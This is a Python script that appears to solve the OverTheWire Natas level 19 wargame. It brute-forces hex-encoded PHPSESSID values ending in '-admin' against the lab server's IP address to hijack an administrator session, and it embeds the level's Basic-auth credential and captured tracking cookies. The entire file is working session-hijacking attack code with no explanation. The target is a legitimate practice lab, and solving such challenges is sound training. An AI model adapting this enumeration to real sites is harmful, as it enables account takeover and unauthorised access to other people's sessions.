import socket

string = []
for x in range(0, 10):
    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    send.connect(("178.79.134.250", 80))
    data = "POST /index.php HTTP/1.1\r\n"
    data += "Host: natas19.natas.labs.overthewire.org\r\n"
    data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=3" + str(x) + "2d61646d696e\r\n"
    data += "Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==\r\n"
    data += "Referer: http://natas19.natas.labs.overthewire.org/\r\n"
    data += "Content-Type: application/x-www-form-urlencoded\r\n"
    data += "Content-Length: 28\r\n"
    data += "\r\n"
    data += "username=admin&password=abcd"
    send.send(data.encode())
    recv = send.recv(3000)
    recv = recv.decode()
    print(str(x))
    if "You are logged in as a regular user" not in recv:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        string += [recv]

    else:
        pass
    
    send.close()

for x in range(0, 10):
    for y in range(0, 10):
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("178.79.134.250", 80))
        data = "POST /index.php HTTP/1.1\r\n"
        data += "Host: natas19.natas.labs.overthewire.org\r\n"
        data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=3" + str(x) + "3"+ str(y) + "2d61646d696e\r\n"
        data += "Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==\r\n"
        data += "Referer: http://natas19.natas.labs.overthewire.org/\r\n"
        data += "Content-Type: application/x-www-form-urlencoded\r\n"
        data += "Content-Length: 28\r\n"
        data += "\r\n"
        data += "username=admin&password=abcd"
        send.send(data.encode())
        recv = send.recv(3000)
        recv = recv.decode()
        print(str(x) + str(y))
        if "You are logged in as a regular user" not in recv:
            print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
            string = [recv]
            print(string)

        else:
            pass
    
        send.close()

for x in range(0, 10):
    for y in range(0, 10):
        for z in range(0, 10):
            send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            send.connect(("178.79.134.250", 80))
            data = "POST /index.php HTTP/1.1\r\n"
            data += "Host: natas19.natas.labs.overthewire.org\r\n"
            data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=3" + str(x) + "3"+ str(y) + "3" + str(z) + "2d61646d696e\r\n"
            data += "Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==\r\n"
            data += "Referer: http://natas19.natas.labs.overthewire.org/\r\n"
            data += "Content-Type: application/x-www-form-urlencoded\r\n"
            data += "Content-Length: 28\r\n"
            data += "\r\n"
            data += "username=admin&password=abcd"
            send.send(data.encode())
            recv = send.recv(3000)
            recv = recv.decode()
            print(str(x) + str(y) + str(z))
            if "You are logged in as a regular user" not in recv:
                print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
                string = recv
                print(string)

            else:
                pass
    
            send.close()
